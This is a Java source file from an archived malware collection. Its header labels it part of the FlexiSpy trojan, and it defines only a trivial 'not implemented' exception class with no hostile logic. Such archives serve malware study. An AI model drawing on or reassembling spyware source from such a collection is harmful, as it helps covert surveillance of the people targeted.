/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.exceptions;
 
/**
 * The exception that is thrown when a requested method or operation is not implemented.
 */
public class FxNotImplementedException extends Throwable {
	
	private static final long serialVersionUID = 1L;
	
	public FxNotImplementedException() { super(); }
	public FxNotImplementedException(String s) { super(s); }
}
